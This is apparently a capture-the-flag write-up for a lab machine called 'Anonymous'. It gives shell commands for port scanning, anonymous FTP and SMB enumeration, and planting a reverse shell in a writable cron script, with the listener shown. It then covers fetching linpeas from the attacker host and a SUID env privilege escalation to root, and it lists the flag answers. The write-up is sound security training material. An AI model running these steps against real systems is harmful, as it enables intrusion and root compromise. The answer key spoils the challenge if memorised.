# Anonymous - Medium

```shell
rustscan -a 10.10.181.97 --range 0-65535 --ulimit 5000 -- -sV

ftp 10.10.181.97
#anonymous login
#get all 3 files from /scripts directory

smbclient -L //10.10.181.97

smbclient //10.10.181.97/pics
#get both image files

#ftp with GUI
#to edit clean.sh
gftp 10.10.181.97
#edit clean.sh & add reverse-shell one-liner

#setup listener
nc -nvlp 5555

#after uploading edited clean.sh
#we get shell

python3 -c 'import pty;pty.spawn("/bin/bash")'
#upgrade shell

cat user.txt

#setup server on attacker machine
python3 -m http.server

#and transfer linpeas.sh to shell
wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

find / -perm -u=s -type f 2>/dev/null

#exploit for env SUID from GTFObins
/usr/bin/env /bin/sh -p
#root shell

cat /root/root.txt
```

```markdown
Open ports & services:

  * 21 - ftp - vsftpd 2.0.8 or later
  * 22 - ssh - OpenSSH 7.6p1
  * 139 - netbios-ssn - Samba smbd
  * 445 - netbios-ssn - Samba smbd

As we do not have any webserver here, we can login to FTP; it allows anonymous login.

We can transfer all 3 files from /scripts in ftp.

There is a script called clean.sh which cleans temporary files and logs the action.

Now, to check the SMB shares, we can use smbclient on the machine.

Enumerating SMB, we can check the 'pics' share for interesting files; we have two image files.

Going back to the ftp share, we can see that we can edit clean.sh

We do so by adding a reverse-shell one-liner, and setting up a listener on our machine.

After uploading the edited clean.sh script with the help of gftp (ftp with GUI), we get a shell.

After reading user.txt, we can use linpeas.sh for checking privesc vectors.

linpeas.sh shows the groups sudo and lxd as privesc vectors; it also shows that /usr/bin/env has SUID bit set.

After confirming that /usr/bin/env has SUID bit set, we can follow exploit given on GTFObins.

This gives us root access.
```

1. Enumerate the machine. How many ports are open? - 4

2. What service is running on port 21? - ftp

3. What service is running on ports 139 and 445? - smb

4. There's a share on the user's computer. What's it called? - pics

5. user.txt - 90d6f992585815ff991e68748c414740

6. root.txt - 4d930091c31a622a7ed10f27999af363
